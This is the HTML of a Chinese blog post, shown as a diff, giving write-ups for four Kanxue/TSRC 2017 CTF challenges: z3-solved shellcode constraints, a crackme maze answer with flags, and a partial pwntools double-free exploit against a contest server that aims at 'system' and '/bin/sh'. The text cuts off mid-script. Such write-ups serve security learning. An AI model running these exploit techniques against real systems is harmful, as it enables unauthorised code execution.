@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="看雪的ctf  以逆向和pwn为主，持续更新，希望能跟下去把">
+<meta property="og:type" content="article">
+<meta property="og:title" content="看雪.TSRC 2017CTF秋季赛　">
+<meta property="og:url" content="https://bestwing.me/2017-Kanxue-TSRC-fall-race.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="看雪的ctf  以逆向和pwn为主，持续更新，希望能跟下去把">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg">
+<meta property="article:published_time" content="2017-10-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:28:04.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="kanxue">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>看雪.TSRC 2017CTF秋季赛　</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017-shwas-Writeup-SeeSea.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017-hacklu-ctf-pwn-writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&text=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&is_video=false&description=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=看雪.TSRC 2017CTF秋季赛　&body=Check out this article: https://bestwing.me/2017-Kanxue-TSRC-fall-race.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&name=看雪.TSRC 2017CTF秋季赛　&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&t=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-Helllo-CTF"><span class="toc-number">1.</span> <span class="toc-text">第一题 Helllo-CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-ctf2017-Fpc"><span class="toc-number">2.</span> <span class="toc-text">第二题 ctf2017_Fpc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98-crackMe"><span class="toc-number">3.</span> <span class="toc-text">第三题 crackMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98-club-pwn"><span class="toc-number">4.</span> <span class="toc-text">第四题 club_pwn</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        看雪.TSRC 2017CTF秋季赛　
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-10-27T16:00:00.000Z" itemprop="datePublished">2017-10-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/kanxue/" rel="tag">kanxue</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/reverse/" rel="tag">reverse</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>看雪的ctf  以逆向和pwn为主，持续更新，希望能跟下去把</p>
+<h2 id="第一题-Helllo-CTF"><a href="#第一题-Helllo-CTF" class="headerlink" title="第一题 Helllo-CTF"></a>第一题 Helllo-CTF</h2><p>明文，不详解</p>
+<h2 id="第二题-ctf2017-Fpc"><a href="#第二题-ctf2017-Fpc" class="headerlink" title="第二题 ctf2017_Fpc"></a>第二题 ctf2017_Fpc</h2><p>讲道理第二题出得很没有道理，<br>输入后的两个call 并没有什么用  干扰视线</p>
+<p>在text段有一段shellcode，构造<code>9876543210ab11A</code>的输入可以跳转到该shellcode上，这是一段很花很花的东西</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg"></p>
+<p>跳转不看，我们将有用的汇编取出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">00413150 | 33 C0                    | xor eax,eax                             |</span><br><span class="line">00413184 | A3 34 B0 41 00           | mov dword ptr ds:[41B034],eax           |</span><br><span class="line">004131BA | 58                       | pop eax                                 |  x    ecx</span><br><span class="line">004131EB | 8B C8                    | mov ecx,eax                             |  x    </span><br><span class="line">0041321F | 58                       | pop eax                                 |  y    ebx</span><br><span class="line">00413254 | 8B D8                    | mov ebx,eax                             |  y</span><br><span class="line">00413289 | 58                       | pop eax                                 |  z    edx</span><br><span class="line">004132B5 | 8B D0                    | mov edx,eax                             |  z </span><br><span class="line">004132AD | 8B D0                    | mov edx,eax                             |</span><br><span class="line"></span><br><span class="line">004132E2 | 8B C1                    | mov eax,ecx                             |  eax &#x3D; ecx &#x3D; x</span><br><span class="line">00413316 | 2B C3                    | sub eax,ebx                             |  eax &#x3D; eax-ecx &#x3D; x-y</span><br><span class="line">00413349 | C1 E0 02                 | shl eax,2                               |  eax &#x3D; (x-y)&lt;&lt;2</span><br><span class="line">00413380 | 03 C1                    | add eax,ecx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x</span><br><span class="line">004133B5 | 03 C2                    | add eax,edx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z</span><br><span class="line">004133E9 | 2D E2 17 F9 EA           | sub eax,EAF917E2                        |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z-0xEAF917E2</span><br><span class="line"></span><br><span class="line">00413455    03C1            ADD EAX,ECX</span><br><span class="line">00413489    2BC3            SUB EAX,EBX                              ; EAX&#x3D;EAX-EBX&#x3D;x-y</span><br><span class="line">004134BF    8BD8            MOV EBX,EAX                              ; EBX&#x3D;x-y</span><br><span class="line">004134F3    D1E0            SHL EAX,1                                ; EAX&#x3D;  (x-y)&lt;&lt;1</span><br><span class="line">00413525    03C3            ADD EAX,EBX                              ; EAX&#x3D;EAX+EBX&#x3D; ((x-y)&lt;&lt;1)+(x-y)</span><br><span class="line">00413559    03C1            ADD EAX,ECX                              ; EAX&#x3D; ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041358F    8BC8            MOV ECX,EAX                              ; ECX&#x3D;EAX</span><br><span class="line">004135C3    03C2            ADD EAX,EDX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x+z</span><br><span class="line">004135F7    2D C808F5E8     SUB EAX,0xE8F508C8                       ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)-0xE8F508C8</span><br><span class="line">00413665    8BC1            MOV EAX,ECX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041365D    8BC1            MOV EAX,ECX                              ; </span><br><span class="line">004136A7    2BC2            SUB EAX,EDX                              ; EAX&#x3D; EAX-EDX&#x3D;((x-y)&lt;&lt;1)+(x-y)+x-z</span><br><span class="line"></span><br><span class="line">esp:</span><br><span class="line">0018FF48   00413835  ASCII &quot;You get it!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后可以获取三个算式<br>我们使用z3求解</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x, y ,z = BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="comment">#x = Real(&#x27;x&#x27;)</span></span><br><span class="line"><span class="comment">#y = Real(&#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#z = Real(&#x27;z&#x27;)</span></span><br><span class="line"></span><br><span class="line">solve(((x - y) &lt;&lt; <span class="number">2</span>) + x + z == <span class="number">0xEAF917E2</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x + z == <span class="number">0xE8F508C8</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x - z == <span class="number">0x0C0A3C68</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in /private/tmp [21:32:21]</span></span><br><span class="line">$ python solve.py</span><br><span class="line">[z = <span class="number">1853187632</span>, y = <span class="number">1919903280</span>, x = <span class="number">1953723722</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag: Just0for0fun11A</p>
+<h2 id="第三题-crackMe"><a href="#第三题-crackMe" class="headerlink" title="第三题 crackMe"></a>第三题 crackMe</h2><p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg"></p>
+<p>运行程序，能看到是有gui的，查找import </p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg"></p>
+<p>能找到<code>GetDlgItemTextA</code>这个是一个处理窗口消息的函数</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg"></p>
+<p>我们通过交叉引用，可以找到程序的关键流程</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg"></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg"></p>
+<p>基本的流程就是：读取用户收入信息。然后做两次base64编码，再用国密算法SM3计算一个hash。计算完hash之后转换成16进制。然后将Hash值的后64位和用户输入进行比较。</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg"></p>
+<p>然后程序的下一个流程 会到一个迷宫游戏</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg"></p>
+<p>能看到迷宫地图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0 1 1 1 1 1 1 1 1 0</span><br><span class="line">0 0 1 1 1 1 1 0 0 0</span><br><span class="line">1 0 0 0 0 0 1 0 1 1</span><br><span class="line">1 1 1 1 1 0 1 0 0 1</span><br><span class="line">1 0 0 0 1 0 1 0 0 1</span><br><span class="line">1 0 1 0 0 0 1 0 1 1</span><br><span class="line">1 0 1 1 1 1 1 0 0 1</span><br><span class="line">1 0 0 0 0 1 1 1 0 0</span><br><span class="line">1 1 1 1 0 0 0 0 1 0</span><br><span class="line">1 1 1 1 1 1 1 0 0 0</span><br></pre></td></tr></table></figure>
+<p>其中的0为可行路径。题目中，替换后的输入字符为q z分别表示向上一行和向下一行；p l分别表示向左一格和向右一格。<br>[3,8]为死路。若输入为\x20，则结束，返回True；若走错，则返回False，验证失败。<br>这里并没有对路径完成量进行约束，也产生了多解可能。这里，我们为简化，可以直接让替换后的第一个字符为\x20。</p>
+<p>总是所述，正确的答案行走路线是：<br>zlzllllzzzppqppzzzlllzlllzllqqpqpqqqqqllq<br>然后根据上面分析到的结果进行逆运算。它的摩尔斯码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--.. .-.. --.. .-.. .-.. .-.. .-.. --.. --.. --.. .--. .--. --.- .--. .--. --.. --.. --.. .-.. .-.. .-.. --.. .-.. .-.. .-.. --.. .-.. .-.. --.- --.- .--. --.- .--. --.- --.- --.- --.- --.- .-.. .-.. --.-&#x2F;</span><br></pre></td></tr></table></figure>
+<p>将上述结果进行2次base64编码<br>最后在末尾附加hash值（就是SM3加密之后的值）就是答案</p>
+<h2 id="第四题-club-pwn"><a href="#第四题-club-pwn" class="headerlink" title="第四题 club_pwn"></a>第四题 club_pwn</h2><p>double free<br>我的简单分析 <a href="https://bbs.pediy.com/thread-222421.htm">https://bbs.pediy.com/thread-222421.htm</a></p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">	debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	libc= CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">	lib = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">	io = process(<span class="string">&#x27;club&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	libc = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">	lib = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">	io = remote(<span class="string">&#x27;123.206.22.95&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main_arena_offset = lib.symbols[&#x27;main_arena&#x27;]</span></span><br><span class="line">system_offset = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">free_offset = lib.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;system_offset:0x%x&quot;</span> % system_offset)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset:0x%x&quot;</span> % binsh_offset)</span><br><span class="line">log.info(<span class="string">&quot;free_offset: 0x%X&quot;</span> % free_offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_box</span>(<span class="params">index,size</span>):</span></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(<span class="string">&#x27;1&#x27;</span>))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory_a_box</span>(<span class="params">index</span>):</span></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(<span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_me_a_message</span>(<span class="params">index,message</span>):</span></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span>(<span class="params">index</span>):</span></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(<span class="string">&#x27;4&#x27;</span>))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_a_randnum</span>(<span class="params">num</span>):</span></span><br><span class="line"></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(<span class="string">&#x27;5&#x27;</span>))</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">	io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_seed</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x148</span>,<span class="number">0x7ffff000</span>,<span class="number">0x1000</span>):</span><br><span class="line">		<span class="comment">#i = i&lt;&lt;12</span></span><br><span class="line">		<span class="comment">#i += 0x148 #seed offset</span></span><br><span class="line">		libc.srand(i)</span><br><span class="line">		randnum = int(libc.rand())</span><br><span class="line">		<span class="keyword">if</span> randnum == int(num):				</span><br><span class="line">			<span class="keyword">return</span> libc.rand()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&#x27;seed&#x27;</span> ,i</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guess_a_randnum(str(<span class="number">0</span>))</span><br><span class="line">n = io.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">num = io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[*]rand1=&#x27;</span>+num</span><br><span class="line"></span><br><span class="line"><span class="comment"># get seed addr and base addr</span></span><br><span class="line"></span><br><span class="line">a=guess_seed(num)</span><br><span class="line"></span><br><span class="line">guess_a_randnum(a)</span><br><span class="line"></span><br><span 